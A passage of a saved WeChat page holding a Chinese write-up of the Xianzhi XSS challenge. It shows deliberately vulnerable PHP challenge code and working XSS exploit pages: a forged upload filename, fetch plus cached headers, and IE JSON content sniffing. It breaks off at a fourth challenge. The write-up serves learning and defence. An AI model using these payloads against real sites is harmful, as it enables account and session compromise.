16px}.rich_media_empty_extra{background-color:#fafafa}.appmsg_skin_default.rich_media_empty_extra{background-color:#fff}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.appmsg_style_default .rich_media_tool{padding-top:15px}.rich_media_title_ios{font-weight:700}.read-more__area{margin:30px 0}.read-more__desc{margin-bottom:10px}.read-more__article__extra{font-size:14px;color:rgba(0,0,0,0.5)}.read-more__article__item{margin-bottom:10px}</style>
+<style>
+        </style>
+<!--[if lt IE 9]>
+<link rel="stylesheet" type="text/css" href="//res.wx.qq.com/mmbizwap/zh_CN/htmledition/style/page/appmsg_new/pc435ee6.css">
+<![endif]-->
+
+    </head>
+    <body id="activity-detail" class="zh_CN mm_appmsg  appmsg_skin_default appmsg_style_default">
+        
+<script nonce="2043559309" type="text/javascript">
+    var biz = ""||"MzI5MzY2MzM0Mw==";
+    var sn = "" || ""|| "673e20a08d9ae6c3de60ca48110b920a";
+    var mid = "" || ""|| "2247484070";
+    var idx = "" || "" || "1";
+    window.__allowLoadResFromMp = true; 
+    
+        
+</script>
+<script nonce="2043559309" type="text/javascript">
+var page_begintime=+new Date,is_rumor="",norumor="";
+1*is_rumor&&!(1*norumor)&&biz&&mid&&(document.referrer&&-1!=document.referrer.indexOf("mp.weixin.qq.com/mp/rumor")||(location.href="http://mp.weixin.qq.com/mp/rumor?action=info&__biz="+biz+"&mid="+mid+"&idx="+idx+"&sn="+sn+"#wechat_redirect"));
+</script>
+<script nonce="2043559309" type="text/javascript">
+var MutationObserver=window.WebKitMutationObserver||window.MutationObserver||window.MozMutationObserver,isDangerSrc=function(t){
+if(t){
+var e=t.match(/http(?:s)?:\/\/([^\/]+?)(\/|$)/);
+if(e&&!/qq\.com(\:8080)?$/.test(e[1])&&!/weishi\.com$/.test(e[1]))return!0;
+}
+return!1;
+},ishttp=0==location.href.indexOf("http://");
+-1==location.href.indexOf("safe=0")&&ishttp&&"function"==typeof MutationObserver&&"mp.weixin.qq.com"==location.host&&(window.__observer_data={
+count:0,
+exec_time:0,
+list:[]
+},window.__observer=new MutationObserver(function(t){
+window.__observer_data.count++;
+var e=new Date,r=[];
+t.forEach(function(t){
+for(var e=t.addedNodes,o=0;o<e.length;o++){
+var n=e[o];
+if("SCRIPT"===n.tagName){
+var i=n.src;
+isDangerSrc(i)&&(window.__observer_data.list.push(i),r.push(n)),!i&&window.__nonce_str&&n.getAttribute("nonce")!=window.__nonce_str&&(window.__observer_data.list.push("inlinescript_without_nonce"),
+r.push(n));
+}
+}
+});
+for(var o=0;o<r.length;o++){
+var n=r[o];
+n.parentNode&&n.parentNode.removeChild(n);
+}
+window.__observer_data.exec_time+=new Date-e;
+}),window.__observer.observe(document,{
+subtree:!0,
+childList:!0
+})),function(){
+if(-1==location.href.indexOf("safe=0")&&Math.random()<.01&&ishttp&&HTMLScriptElement.prototype.__lookupSetter__&&"undefined"!=typeof Object.defineProperty){
+window.__danger_src={
+xmlhttprequest:[],
+script_src:[],
+script_setAttribute:[]
+};
+var t="$"+Math.random();
+HTMLScriptElement.prototype.__old_method_script_src=HTMLScriptElement.prototype.__lookupSetter__("src"),
+HTMLScriptElement.prototype.__defineSetter__("src",function(t){
+t&&isDangerSrc(t)&&window.__danger_src.script_src.push(t),this.__old_method_script_src(t);
+});
+var e="element_setAttribute"+t;
+Object.defineProperty(Element.prototype,e,{
+value:Element.prototype.setAttribute,
+enumerable:!1
+}),Element.prototype.setAttribute=function(t,r){
+"SCRIPT"==this.tagName&&"src"==t&&isDangerSrc(r)&&window.__danger_src.script_setAttribute.push(r),
+this[e](t,r);
+};
+}
+}();
+</script>
+
+        <link rel="dns-prefetch" href="//res.wx.qq.com">
+<link rel="dns-prefetch" href="//mmbiz.qpic.cn">
+<link rel="shortcut icon" type="image/x-icon" href="//res.wx.qq.com/a/wx_fed/assets/res/NTI4MWU5.ico">
+<link rel="mask-icon" href="//res.wx.qq.com/a/wx_fed/assets/res/MjliNWVm.svg" color="#4C4C4C">
+<link rel="apple-touch-icon-precomposed" href="//res.wx.qq.com/a/wx_fed/assets/res/OTE0YTAw.png">
+<script nonce="2043559309" type="text/javascript">
+    String.prototype.html = function(encode) {
+        var replace =["&#39;", "'", "&quot;", '"', "&nbsp;", " ", "&gt;", ">", "&lt;", "<", "&yen;", "¥", "&amp;", "&"];
+        
+		
+		
+		
+		
+        
+        var replaceReverse = ["&", "&amp;", "¥", "&yen;", "<", "&lt;", ">", "&gt;", " ", "&nbsp;", '"', "&quot;", "'", "&#39;"];
+	    var target;
+	    if (encode) {
+	    	target = replaceReverse;
+	    } else {
+	    	target = replace;
+	    }
+        for (var i=0,str=this;i< target.length;i+= 2) {
+             str=str.replace(new RegExp(target[i],'g'),target[i+1]);
+        }
+        return str;
+    };
+
+    window.isInWeixinApp = function() {
+        return /MicroMessenger/.test(navigator.userAgent);
+    };
+
+    window.getQueryFromURL = function(url) {
+        url = url || 'http://qq.com/s?a=b#rd'; 
+        var tmp = url.split('?'),
+            query = (tmp[1] || "").split('#')[0].split('&'),
+            params = {};
+        for (var i=0; i<query.length; i++) {
+            var arg = query[i].split('=');
+            params[arg[0]] = arg[1];
+        }
+        if (params['pass_ticket']) {
+        	params['pass_ticket'] = encodeURIComponent(params['pass_ticket'].html(false).html(false).replace(/\s/g,"+"));
+        }
+        return params;
+    };
+
+    (function() {
+	    var params = getQueryFromURL(location.href);
+        window.uin = params['uin'] || "" || '';
+        window.key = params['key'] || "" || '';
+        window.wxtoken = params['wxtoken'] || '';
+        window.pass_ticket = params['pass_ticket'] || '';
+        window.appmsg_token = "";
+    })();
+
+    function wx_loaderror() {
+        if (location.pathname === '/bizmall/reward') {
+            new Image().src = '/mp/jsreport?key=96&content=reward_res_load_err&r=' + Math.random();
+        }
+    }
+
+</script>
+
+<script nonce="2043559309" type="text/javascript">
+        window.__moon_report_uin = "0";
+            window.no_moon_ls = 0;
+    </script>
+
+        
+<script nonce="2043559309" type="text/javascript">
+    var write_sceen_time = (+new Date()); 
+</script>
+
+<div id="js_article" class="rich_media">
+    
+    <div id="js_top_ad_area" class="top_banner"></div>
+    
+    <div class="rich_media_inner">
+
+        
+        
+        <div id="page-content" class="rich_media_area_primary">
+          <div class="rich_media_area_primary_inner">
+                                    
+                        
+
+            <div id="img-content">
+
+                
+                <h2 class="rich_media_title" id="activity-name">
+                    
+                    
+                    先知XSS挑战赛 - L3m0n Writeup
+
+                                                                                </h2>
+                <div id="meta_content" class="rich_media_meta_list">
+                                                            <span id="copyright_logo" class="rich_media_meta rich_media_meta_text meta_tag_text">原创：</span>
+                                                            <span class="rich_media_meta rich_media_meta_text">
+                                                L3m0n@Syclover
+                                            </span>
+                                        
+                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
+                      <a href="javascript:void(0);" id="js_name">
+                        先知安全技术社区                      </a>
+                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
+                          <div class="profile_inner">
+                              <strong class="profile_nickname">先知安全技术社区</strong>
+                              <img class="profile_avatar" id="js_profile_qrcode_img" src="" alt="">
+
+                              <p class="profile_meta">
+                              <label class="profile_meta_label">微信号</label>
+                              <span class="profile_meta_value"></span>
+                              </p>
+
+                              <p class="profile_meta">
+                              <label class="profile_meta_label">功能介绍</label>
+                              <span class="profile_meta_value">先知安全技术社区官方公众号</span>
+                              </p>
+                              
+                          </div>
+                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
+                              <i class="profile_arrow arrow_out"></i>
+                              <i class="profile_arrow arrow_in"></i>
+                          </span>
+                      </div>
+                    </span>
+
+
+                    <em id="publish_time" class="rich_media_meta rich_media_meta_text"></em>
+
+
+
+
+
+                </div>
+                
+                
+                
+                
+                                                
+                                                                
+                                
+                
+                <div class="rich_media_content " id="js_content">
+                    
+
+                    
+
+                    
+                    
+                    <section class="xmteditor" style="display:none;" data-tools="新媒体管家" data-label="powered by xmt.cn"></section><section class="xmt-style-block" data-style-type="2" data-tools="新媒体排版" data-id="2327"><section class="" style="border-width: 0px; border-style: none; border-color: initial; padding: 0px;"><section style="border-width: 0px; border-style: none; border-color: initial;"><section class="white" style="color:rgb(255,255,255); padding-top: 5px; padding-right: 10px; padding-left: 35px; margin-left: 27px; border-left-width: 2px; border-left-style: dotted; border-color: rgb(250, 140, 0) rgb(250, 140, 0) rgb(250, 140, 0) rgb(228, 228, 228);"><section class="count" style="width: 32px; height: 32px; margin-left: -53px; margin-top: 23px; color:inherit; text-align: center; line-height: 32px; border-top-left-radius: 16px; border-top-right-radius: 16px; border-bottom-right-radius: 16px; border-bottom-left-radius: 16px; background-color:#57d9ff;">1</section><section style="margin-top: -30px; padding-bottom: 10px; color: inherit;"><p style="clear: both; line-height: 1.5em; font-size: 14px; color: inherit; white-space: normal;"><span style="font-size:16px"><strong class="active title" style="color:rgb(121,121,121">小编注</strong></span></p><p style="clear: both; line-height: 1.5em; font-size: 14px; color:rgb(121,121,121); white-space: normal;">感谢 出题人：M &nbsp;审核人：Mannix</p><p style="clear: both; line-height: 1.5em; font-size: 14px; color:rgb(121,121,121); white-space: normal;">感谢以下的参与者，百忙之中抽时间来参与。（欢迎以下各位私聊我）</p></section></section></section></section></section><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">XSS#01. Mannix,L3m0n,Aegis,xq17,nearg1e,mogujie@蘑菇街,evi1m0,w4f05,phantom0301,blackwolf
+XSS#02. L3m0n,mogujie@蘑菇街,Aegis,evil7,PKAV
+XSS#03. L3m0n,mogujie@蘑菇街,Mazing@湖南金盾
+XSS#04. zusheng,feiyu,Mannix,Evi14ui,L3m0n,V@1n3R,Scriptkid,xq17,Mathias,mogujie@蘑菇街,evi1m0,nearg1e,Mazing@湖南金盾,Aegis,maya66,w4f05,RickyHao,DK,phantom0301
+XSS#05. evi1m0,zusheng,xq17,V@1n3R,riverheart(河流之心),L3m0n,Mathias,phantom0301
+XSS#06. Flyin9(数据流),xq17,kingdom017,L3m0n,evi1m0,evil7,Mathias,DK,Scriptkid,Aegis,phantom0301,blackwolf
+XSS#07. evi1m0,MagicBlue,L3m0n,riverheart(河流之心),xq17,Aegis,PKAV,RickyHao,Mathias
+XSS#08. PKAV,L3m0n
+XSS#09. L3m0n
+XSS#10. evi1m0,z0z,L3m0n,riverheart(河流之心),xq17,nearg1e,Mathias,phantom0301,Ox9A82
+XSS#11. L3m0n,nearg1e,evi1m0,RickyHao,Mathias
+XSS#12. L3m0n,Mathias,PKAV,phantom0301
+XSS#13. nearg1e,Mannix,p4ny,Scriptkid,xq17,L3m0n,Mathias,evi1m0,mogujie@蘑菇街,DK,maya66,wps2015,RickyHao,Aegis,riverheart(河流之心),PKAV,phantom0301,w4f05
+XSS#14. Mannix,Scriptkid,z0z,evi1m0,xq17,Evi14ui,p4ny,L3m0n,V@1n3R,feiyu,朽木,秋风,Mazing@湖南金盾,raul17,Mathias,mogujie@蘑菇街,L1p,TaeJa,DK,omego,gethin,w4f05,小毒物,wps2015,RickyHao,Aegis,update,PKAV,blackwolf,nearg1e,ding13,phantom0301
+XSS#15. PKAV,L3m0n,evi1m0,Mathias
+XSS#16. L3m0n,riverheart(河流之心),xq17,Mannix,feiyu,evi1m0,PKAV,Mathias,RickyHao
+XSS#17. L3m0n,evi1m0,mogujie@蘑菇街,Mathias,nearg1e,Scriptkid,Aegis,仲ma,p4ny,DK,xq17,wps2015,evil7,PKAV,blackwol,Evi14ui,phantom0301,Ox9A82
+XSS#18. L3m0n,PKAV,evi1m0,xq17
+XSS#19. 落
+XSS#20. evil7,evi1m0
+番</code></pre><p><br  /></p><section class="xmt-style-block" data-style-type="2" data-tools="新媒体排版" data-id="2327"><section class="" style="border-width: 0px; border-style: none; border-color: initial; padding: 0px;"><section style="border-width: 0px; border-style: none; border-color: initial;"><section class="white" style="padding-top: 5px; padding-right: 10px; padding-left: 35px; margin-left: 27px; border-left: 2px dotted rgb(228, 228, 228); border-top-color: rgb(250, 140, 0); border-right-color: rgb(250, 140, 0); border-bottom-color: rgb(250, 140, 0);"><section class="count" style="color: inherit; width: 32px; height: 32px; margin-left: -53px; margin-top: 23px; text-align: center; line-height: 32px; border-radius: 16px; background-color: rgb(87, 217, 255);">2</section><section style="margin-top: -30px; padding-bottom: 10px;"><p style="color: inherit; clear: both; line-height: 1.5em; font-size: 14px; white-space: normal;"><span style="font-size:16px"><strong class="active title" style="color:rgb(121,121,121">获奖者</strong></span></p><p style="color: rgb(121, 121, 121); clear: both; line-height: 1.5em; font-size: 14px; white-space: normal;"><strong style="color: rgb(0, 168, 176); white-space: normal;">L3m0n@Syclover、evi1m0@YSRC、Mathias@Xuanwu Lab、xq17@米斯特、PKAV</strong></p></section></section><section style="width: 0px; height: 0px; clear: both;"></section></section></section></section><p><br  /></p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;"><span style="font-size: 18px;"><span style="font-weight: bold;">0x01. 絮叨</span>&nbsp;</span><span style="font-size: 10px;">&nbsp;</span><span style="font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;</span></h3><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;"><span style="font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;玩了挺久的一个挑战，整个过程中被虐到变形，感谢M师傅的小课堂，学习到很多新姿势.</span><strong style="font-size: 14px;">ps:Writeup中的ref为M师傅出题的参考链接。</strong></h3><section class="xmt-style-block" data-style-type="2" data-tools="新媒体排版" data-id="2320"><section class="" style="border-width: 0px; border-style: none; border-color: initial; padding: 0px;"><section style="border-width: 0px; border-style: none; border-color: initial;"><p style="white-space: normal;"><span style="color:#57d9ff">M师傅语录</span></p><section style="border-color: transparent transparent #57d9ff; border-style: solid; border-width: 10px; float: none; height: 0px; margin-top: -10px; margin-right: auto; margin-left: 30px; width: 0px;"></section><section style="margin-top: -1px; line-height: 22px; border-width: 1px; border-style: solid; border-color: rgb(87, 217, 255); color: rgb(255, 255, 255); border-radius: 2px; text-align: center;"><section style="border-color: transparent transparent rgb(254, 254, 254); border-style: solid; border-width: 10px; height: 0px; margin-top: -18px; margin-right: auto; margin-left: 29px; width: 0px; color: inherit;"></section><section data-style="color:rgb(216,216,216)" style="padding: 10px;"><p style="color: inherit; white-space: normal;"><span class="pBrush" style="color:#D8D8D8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: rgb(0, 0, 0);">题目很多围绕着security header来出题，希望开发者重视这些问题，在防御上，正确的设置下面的值，是能够避免很多问题</span>.&nbsp;<strong style="white-space: normal;"><span style="color: rgb(204, 0, 0);">content-type、x-xss-protection、x-frame-options、x-content-type-options</span></strong></span></p><p style="white-space: normal;"><br  /></p></section></section><section style="width: 0px; height: 0px; clear: both;"></section></section><p style="white-space: normal;"><br  /></p></section></section><p style="margin-bottom: 1.2em !important;"><span style="font-weight: bold; font-size: 18px;">0x02. 解题</span></p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">1. 文件上传</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("X-XSS-Protection: 0");
+$target_dir = "uploads/";
+$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
+$uploadOk = 1;
+$imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);
+// Check if image file is a actual image or fake image
+if(isset($_POST["submit"])) {
+ &nbsp; &nbsp;$check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
+ &nbsp; &nbsp;if($check !== false) {
+ &nbsp; &nbsp; &nbsp; &nbsp;echo "File is an image - " . $check["mime"] . ".&lt;BR&gt;";
+ &nbsp; &nbsp; &nbsp; &nbsp;$uploadOk = 1;
+ &nbsp; &nbsp;} else {
+ &nbsp; &nbsp; &nbsp; &nbsp;echo "File is not an image.";
+ &nbsp; &nbsp; &nbsp; &nbsp;$uploadOk = 0;
+ &nbsp; &nbsp;}
+}
+// Check if file already exists
+if (file_exists($target_file)) {
+ &nbsp; &nbsp;echo "Sorry, file already exists.";
+ &nbsp; &nbsp;$uploadOk = 0;
+}
+// Check file size
+if ($_FILES["fileToUpload"]["size"] &gt; 500000) {
+ &nbsp; &nbsp;echo "Sorry, your file is too large.";
+ &nbsp; &nbsp;$uploadOk = 0;
+}
+// Allow certain file formats
+if($imageFileType != "jpg" &amp;&amp; $imageFileType != "png" &amp;&amp; $imageFileType != "jpeg"
+&amp;&amp; $imageFileType != "gif" ) {
+ &nbsp; &nbsp;echo "Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed.";
+ &nbsp; &nbsp;$uploadOk = 0;
+}
+// Check if $uploadOk is set to 0 by an error
+if ($uploadOk == 0) {
+ &nbsp; &nbsp;echo "Sorry, your file was not uploaded.";
+// if everything is ok, try to upload file
+} else {
+ &nbsp; &nbsp; &nbsp; &nbsp;echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";
+}
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss1.php</p><p style="margin-bottom: 1.2em !important;">此题xss点是在文件上传后，页面会显示文件名，但是有一个问题就是，如何自动化的利用？
+毕竟js上传文件有跨域问题，那么也就只能利用html表单</p><p style="margin-bottom: 1.2em !important;">通过这样的思路找到还可以利用html表单上传文件?http://blog.bentkowski.info/2015/05/xss-via-file-upload-wwwgooglecom.html</p><p style="margin-bottom: 1.2em !important;">其实文件并没有上传，只是利用表单的name，闭合一下后添加了fielname</p><p style="margin-bottom: 1.2em !important;">正常文件上传：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIpgOSLQpYt4viblZnd3uT86ia8XGR42wPWp04NjRo67d8vCoqXJu4ib1sXnJ6RRjiabTHomiaW5H1xQHOQ/0.png" class="" data-ratio="0.6072992700729927" data-w="685" data-type="png"  /></p><p style="margin-bottom: 1.2em !important;">带有content-type</p><p style="margin-bottom: 1.2em !important;">伪造文件上传:</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIpgOSLQpYt4viblZnd3uT86iakcx7hksibicntx7uic2abUw4rKV4bE1pHR1e5NRWia2wmNgWQ0oADRGvcw/0.png" class="" data-ratio="0.31370967741935485" data-w="1240" data-type="png"  /></p><p style="margin-bottom: 1.2em !important;">不带有content-type，但是<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">$_FILES["fileToUpload"]["name"]</code>还是可以接受到值的</p><p style="margin-bottom: 1.2em !important;">所以可以构造一下Exp:</p><p style="margin-bottom: 1.2em !important;">http://ns1.rootk.pw:8080/xss/wp/1.html</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;html&gt;
+&lt;body&gt;
+ &nbsp; &nbsp;&lt;form id="xss" action="http://xianzhi.aliyun.com/xss1.php" method="POST" enctype="multipart/form-data"&gt;
+ &nbsp; &nbsp; &nbsp;&lt;textarea type="text" id="vulnerable" value="" /&gt;&lt;/textarea&gt;
+ &nbsp; &nbsp;&lt;/form&gt;
+ &lt;script&gt;
+ var tarfile = "test";
+ var vuln = document.getElementById('vulnerable');
+ vuln.name = "x\"; name=fileToUpload; filename=\"&lt;img src=1 onerror=alert(document.domain)&gt;.jpg";
+ vuln.value = (tarfile);
+ document.getElementById("xss").submit();
+ &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p style="margin-bottom: 1.2em !important;">当时自己并非用的<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">textarea</code>标签，而是input，这个标签只能用到IE8，之后的版本会对双引号进行url编码</p><p style="margin-bottom: 1.2em !important;">ref: http://kuza55.blogspot.hk/2008/02/csrf-ing-file-upload-fields.html</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">2. getallheaders()</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header('Pragma: cache');
+header("Cache-Control: max-age=".(60*60*24*100)); 
+header("X-XSS-Protection: 0");
+?&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=utf-8&gt;
+&lt;head&gt;
+&lt;body&gt;
+&lt;?php
+if(isset($_SERVER['HTTP_REFERER'])) 
+{
+echo "Bad Referrer!";
+}
+else
+{
+foreach (getallheaders() as $name =&gt; $value) {
+ &nbsp; &nbsp;echo "$name: $value\n";
+}
+}
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss2.php</p><p style="margin-bottom: 1.2em !important;">此题就是会把HTTP所有信息输出到页面，但是不能使用Referrer
+问题也很明显，请求这个地址，而且又是能够利用代码自动化的添加头去请求.</p><p style="margin-bottom: 1.2em !important;">这里面特别要注意的是开始的两个头</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">header('Pragma: cache');
+header("Cache-Control: max-age=".(60*60*24*100));</code></pre><p style="margin-bottom: 1.2em !important;">也就是浏览器会对网页进行缓存，那么如果第一次我能够修改http头然后再进行跨域请求，第二次再请求一次的时候，http的信息还是不会变的，因为直接读取了本地缓存内容.</p><p style="margin-bottom: 1.2em !important;">所以可以使用<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">Fetch</code>先请求，在利用iframe框架进行第二请求，另外注意的就是需要通过meta标签来设置一下referrer，也就是第二次iframe加载的时候是不带referer的.按道理可以在FF下面也成功，不过好像FF不支持meta这样禁止referer</p><p style="margin-bottom: 1.2em !important;">Chrome Exp:http://ns1.rootk.pw:8080/xss/wp/2.php</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;html&gt;
+&lt;head&gt;
+&lt;meta name="referrer" content="never"&gt;
+&lt;script&gt;
+var request = new Request('http://xianzhi.aliyun.com/xss2.php', {
+ &nbsp;method: 'GET',
+ &nbsp;mode: 'no-cors',
+ &nbsp;redirect: 'follow',
+ &nbsp;headers: new Headers({
+ &nbsp; &nbsp;'Content-Type': 'text/plain',
+ &nbsp; &nbsp;'Accept': 'application/jsona&lt;img src=1 onerror=alert(document.domain)&gt;',
+ &nbsp;})
+});
+fetch(request).then(function() {
+ &nbsp;console.log(1);
+});
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;iframe src="http://xianzhi.aliyun.com/xss2.php"&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><p style="margin-bottom: 1.2em !important;">ref: https://www.w3.org/TR/cors/#simple-header</p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">3. json</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("Content-Type:application/json;charset=utf-8");
+header("X-XSS-Protection: 0");
+echo '{"errno":0,"error":"","data":{"user":{"id":"2","user_name":"\u4e13\u4e1a\u6295\u8d44\u4ebafh","email":"","mobile":"139****0002","intro":"'.$_GET["value"].'","address":null,"photo":"\/avatar\/000\/00\/00\/02virtual_avatar_big.jpg","user_uuid":"779ab6bd7e2df90c37f1e892","header_url":"\/avatar\/000\/00\/00\/02virtual_avatar_big.jpg","user_id":"2","is_real_name":0,"is_real_name_string":"\u672a\u5b9e\u540d\u8ba4\u8bc1","real_name":"\u5c24\u6654","is_investor":0,"is_leader_investor":1,"cetificate_id":"511********4273","focus_area":["\u91d1\u878d:\u91c7\u8d2d\u7269\u6d41:\u80fd\u6e90\u73af\u4fdd:\u6cd5\u5f8b\u6559\u80b2:"],"third_party":[{"openid":"1212","type":1,"is_band":1},{"openid":"2oiVL4wNxso9ttarGMIoVa1q-w8kU","type":1,"is_band":1}]}}}'
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">http://xianzhi.aliyun.com/xss3333.php?value=test</p><p style="margin-bottom: 1.2em !important;">这个题目问题在于返回头是<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">application/json</code>，又应该如何xss</p><p style="margin-bottom: 1.2em !important;">这里利用了IE一个bug，参考文章：http://www.qingpingshan.com/jb/javascript/184536.html</p><p style="margin-bottom: 1.2em !important;">IE11 Exp:http://ns1.rootk.pw:8080/xss/wp/3.html</p><p style="margin-bottom: 1.2em !important;">3.html</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;meta charset=utf-8&gt;
+&lt;iframe id=x src=3.php&gt;&lt;/iframe&gt;
+&lt;script&gt;
+x.location.reload();
+&lt;/script&gt;</code></pre><p style="margin-bottom: 1.2em !important;">3.php</p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">&lt;?php
+header("location: http://xianzhi.aliyun.com/xss3333.php?value=%3Cimg%20src=x%20onerror=alert(document.domain)%3E");
+?&gt;</code></pre><p style="margin-bottom: 1.2em !important;">修复方案: 加上响应头，<code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; padding-right: 0.3em; padding-left: 0.3em; white-space: pre-wrap; border-width: 1px; border-style: solid; border-color: rgb(234, 234, 234); background-color: rgb(248, 248, 248); border-radius: 3px; display: inline;">X-Content-Type-Options: nosniff</code></p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">4. Referer</h3><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 